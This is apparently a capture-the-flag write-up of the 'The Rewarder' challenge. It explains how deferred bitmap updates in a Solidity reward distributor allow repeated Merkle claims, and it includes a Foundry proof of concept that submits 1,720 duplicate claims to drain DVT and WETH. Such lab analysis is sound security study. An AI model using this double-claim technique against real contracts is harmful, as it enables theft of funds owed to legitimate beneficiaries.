
## 1. Vulnerability Summary

The `TheRewarderDistributor` contract contains a vulnerability in its `claimRewards()` function that allows a beneficiary to claim the same distribution multiple times within a single transaction.

The contract uses bitmaps to track whether a beneficiary has already claimed a particular distribution batch.

However, instead of immediately updating the claimed bitmap for each individual claim, the contract accumulates claim amounts and bitmap positions and updates the state only when switching tokens or processing the final claim.

This creates an opportunity to submit multiple claims referencing the same batch before its claimed status is recorded.

Since each claim independently passes Merkle proof verification, the contract transfers tokens repeatedly while recording the batch as claimed only once.

## 2. Affected Code

**Contract:** `TheRewarderDistributor.sol`  
**Function:** `claimRewards()`

### A. Deferred Bitmap Updates

```solidity
if (token != inputTokens[inputClaim.tokenIndex]) {
    if (address(token) != address(0)) {
        if (!_setClaimed(token, amount, wordPosition, bitsSet))
            revert AlreadyClaimed();
    }

    token = inputTokens[inputClaim.tokenIndex];
    bitsSet = 1 << bitPosition;
    amount = inputClaim.amount;
} else {
    bitsSet = bitsSet | 1 << bitPosition;
    amount += inputClaim.amount;
}
```

**Root Cause:**

The contract aggregates claim amounts and bitmap positions for consecutive claims belonging to the same token.

The `_setClaimed()` function is not called for every individual claim.

Consequently, repeated claims referencing the same batch can be accumulated before the claimed bitmap is updated.

### B. Bitmap Validation

```solidity
uint256 currentWord =
    distributions[token].claims[msg.sender][wordPosition];

if ((currentWord & newBits) != 0)
    return false;

// update state
distributions[token].claims[msg.sender][wordPosition] =
    currentWord | newBits;

distributions[token].remaining -= amount;
```

The bitmap checks whether the corresponding batch bit has already been set.

However, this validation occurs only when `_setClaimed()` is eventually executed.

Multiple claims can therefore pass through the loop before the bitmap records the batch as claimed.

### C. Independent Merkle Verification and Token Transfer

```solidity
bytes32 leaf = keccak256(
    abi.encodePacked(msg.sender, inputClaim.amount)
);

bytes32 root =
    distributions[token].roots[inputClaim.batchNumber];

if (!MerkleProof.verify(inputClaim.proof, root, leaf))
    revert InvalidProof();

inputTokens[inputClaim.tokenIndex].transfer(
    msg.sender,
    inputClaim.amount
);
```

Each claim independently verifies its Merkle proof and transfers its specified token amount.

There is no immediate bitmap update preventing another identical claim from being processed in the same transaction.

## 3. Exploitation Mechanism

The exploit uses repeated valid claims for the same beneficiary, token and distribution batch.

**Stage 1 – Generate Valid Merkle Proofs**

The attacker loads the DVT and WETH distribution JSON files and generates their Merkle leaves.

```solidity
bytes32[] memory dvtLeaves =
    _loadRewards("/test/the-rewarder/dvt-distribution.json");

bytes32[] memory wethLeaves =
    _loadRewards("/test/the-rewarder/weth-distribution.json");
```

The attacker obtains valid proofs for their own beneficiary entries:

```solidity
bytes32[] memory proof =
    merkle.getProof(dvtLeaves, 188);

bytes32[] memory proof2 =
    merkle.getProof(wethLeaves, 188);
```

**Stage 2 – Construct Repeated Claims**

The attacker creates an array containing 1,720 claims:

- 867 DVT claims.
- 853 WETH claims.

All claims reference batch number `0` and reuse their respective valid Merkle proofs.

**Stage 3 – Exploit Deferred Bitmap Updates**

The distributor processes consecutive claims belonging to the same token.

Instead of immediately recording each claim as consumed, it accumulates their amounts and bitmap positions.

Repeated references to batch `0` produce the same bitmap bit.

The individual Merkle verifications and token transfers continue before the accumulated claim state is committed.

When the token changes, the previous token's accumulated claim state is finally updated.

The same process occurs for the final token group.

**Stage 4 – Recover Distributed Tokens**

After receiving the tokens, the attacker transfers the acquired DVT and WETH to the designated recovery address.

## 4. Proof of Concept (Foundry)

### Step 1 – Prepare Merkle Proofs

```solidity
bytes32[] memory proof =
    merkle.getProof(dvtLeaves, 188);

bytes32[] memory proof2 =
    merkle.getProof(wethLeaves, 188);
```

### Step 2 – Construct Repeated DVT Claims

```solidity
Claim[] memory claims = new Claim[](1720);

for (uint256 i = 0; i < 867; i++) {
    claims[i] = Claim({
        batchNumber: 0,
        amount: PLAYER_DVT_CLAIM_AMOUNT,
        tokenIndex: 0,
        proof: proof
    });
}
```

### Step 3 – Construct Repeated WETH Claims

```solidity
claims[867] = Claim({
    batchNumber: 0,
    amount: PLAYER_WETH_CLAIM_AMOUNT,
    tokenIndex: 1,
    proof: proof2
});

for (uint256 i = 868; i < 1719; i++) {
    claims[i] = Claim({
        batchNumber: 0,
        amount: PLAYER_WETH_CLAIM_AMOUNT,
        tokenIndex: 1,
        proof: proof2
    });
}

claims[1719] = Claim({
    batchNumber: 0,
    amount: PLAYER_WETH_CLAIM_AMOUNT,
    tokenIndex: 1,
    proof: proof2
});
```

### Step 4 – Execute the Exploit

```solidity
vm.startPrank(player);

distributor.claimRewards({
    inputClaims: claims,
    inputTokens: tokensToClaim
});

vm.stopPrank();
```

### Step 5 – Transfer Recovered Tokens

```solidity
vm.startPrank(player);

dvt.transfer(address(recovery), dvt.balanceOf(player));

weth.transfer(address(recovery), weth.balanceOf(player));

vm.stopPrank();
```

## 5. Security Impact

- **Duplicate Claims:** A beneficiary can repeatedly claim the same distribution batch within one transaction.
- **Unauthorized Token Extraction:** Repeated valid Merkle claims allow extraction of significantly more tokens than the beneficiary's original allocation.
- **Accounting Manipulation:** The contract aggregates claim amounts while recording the batch as claimed only once.
- **Distribution Depletion:** Repeated claims can drain the remaining DVT and WETH distribution balances.

## 6. Conclusion

The vulnerability originates from deferred bitmap updates inside `claimRewards()`.

By accumulating multiple claims before updating the claimed state, the contract allows repeated claims referencing the same distribution batch to pass Merkle verification and trigger multiple token transfers.

The Merkle proofs remain cryptographically valid; the failure lies in the distributor's claim-tracking logic.

**Result:** The Foundry PoC successfully demonstrates repeated DVT and WETH claims within a single transaction, allowing the attacker to recover the remaining distribution funds.
